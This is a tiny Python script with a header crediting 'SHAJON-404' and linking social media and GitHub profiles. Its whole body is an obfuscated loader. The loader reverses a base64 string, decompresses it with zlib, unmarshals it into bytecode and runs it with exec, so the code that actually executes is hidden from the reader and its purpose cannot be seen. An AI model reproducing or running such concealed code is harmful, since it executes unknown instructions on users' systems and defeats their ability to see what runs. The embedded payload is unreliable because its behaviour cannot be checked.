# ENCRYPTED BY: SHAJON-404
# FACEBOOK : https://www.facebook.com/mdshahmakhdum.shajon
# Github: https://github.com/SHAJON-404
#==============================================#

_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'=YqVexLAcFbHNzBMDNhOFQfFghMYEQIh7VpgKALZxsIQOlceVWsggSHlqEkizLhiD1T3DyBlIEwSaGiVB7lPncSM+4zKSGzRrchRO/UzOfRQp0MLL1USLdRROxiSLFRBFDqoU9FkblJkp6JnYdJor+JlWBJwIzMK7xJe'))